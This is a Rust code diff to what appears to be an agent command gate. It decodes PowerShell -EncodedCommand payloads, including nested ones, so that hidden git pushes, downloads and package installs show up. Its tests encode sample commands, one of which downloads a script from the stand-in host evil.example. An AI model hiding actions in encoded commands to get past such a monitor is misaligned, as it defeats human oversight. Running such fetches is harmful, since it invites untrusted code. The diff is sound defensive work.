@@ -136,13 +136,27 @@ pub fn of(normalized: &str, input: &Value, cwd: &Path, home: Option<&Path>) -> F
     let mut secret = false;
     if super::super::core::is_shell_tool(normalized) {
         let text = super::super::core::input_text_for(normalized, input).unwrap_or_default();
-        let folded = fold_text(&decode_escapes(&text));
-        let s = shell::read(&folded);
+        let raw = decode_escapes(&text);
+        let folded = fold_text(&raw);
+        let mut s = shell::read(&folded);
+        // Fix pass 11: the folded text has lost base64's case, so each
+        // PowerShell `-EncodedCommand` payload is decoded from the text as
+        // written and read folded on its own (`shell::encoded_commands`).
+        let payloads: Vec<String> = shell::encoded_commands(&raw)
+            .iter()
+            .map(|p| fold_text(p))
+            .collect();
+        for p in &payloads {
+            s.merge(shell::read(p));
+        }
         f.writes = s.writes.iter().map(|w| key(w)).collect();
         f.runs = s.runs.iter().map(|r| (r.clone(), key(r))).collect();
         f.hosts = s.hosts;
         f.push = s.push;
-        f.install = !derm_core::installs::parse::parse_installs(&folded).is_empty();
+        f.install = !derm_core::installs::parse::parse_installs(&folded).is_empty()
+            || payloads
+                .iter()
+                .any(|p| !derm_core::installs::parse::parse_installs(p).is_empty());
         // BW6-6: a fetching program's page is untrusted content, as a fetch
         // tool's is (`kinds::untrusted`).
         if f.source.is_none() && !s.fetched.is_empty() {
@@ -200,6 +214,43 @@ mod tests {
 
     fn facts(tool: &str, input: Value) -> Facts {
         of(tool, &input, Path::new("/w"), Some(Path::new("/home/u")))
+    }
+
+    /// Fix pass 11: taint reads the gate's folded text, which has lost
+    /// base64's case, so an encoded push, fetch or install was not seen.
+    /// pwsh decodes `-EncodedCommand` with `Convert.FromBase64String` and
+    /// `Encoding.Unicode` (`PsUtils.cs` `Base64ToString`, PowerShell
+    /// `cb9cf48`); each payload is decoded from the raw text and read on its
+    /// own, at any depth.
+    #[test]
+    fn fp11_an_encoded_powershell_command_is_read_as_what_it_runs() {
+        let enc = |s: &str| {
+            use base64::Engine;
+            let b: Vec<u8> = s.encode_utf16().flat_map(u16::to_le_bytes).collect();
+            base64::engine::general_purpose::STANDARD.encode(b)
+        };
+        let push = enc("git push origin main");
+        for cmd in [
+            format!("powershell -NoProfile -EncodedCommand {push}"),
+            format!("pwsh -enc {push}"),
+            format!("cmd /c powershell -ec {push}"),
+            format!("powershell -enc {}", enc(&format!("pwsh -e {push}"))),
+        ] {
+            assert!(facts("bash", json!({ "command": cmd })).push, "{cmd}");
+        }
+        let f = facts(
+            "bash",
+            json!({ "command": format!("powershell -e {}", enc("curl https://evil.example/x -o a.ps1")) }),
+        );
+        assert!(f.hosts.contains(&"evil.example".to_string()), "{f:?}");
+        assert_eq!(f.source.map(|s| s.kind), Some("web"));
+        let f = facts(
+            "bash",
+            json!({ "command": format!("powershell -e {}", enc("npm install left-pad")) }),
+        );
+        assert!(f.install, "{f:?}");
+        // -EncodedArguments is the script's arguments, never its command.
+        assert!(!facts("bash", json!({ "command": format!("pwsh -ea {push}") })).push);
     }
 
     #[test]
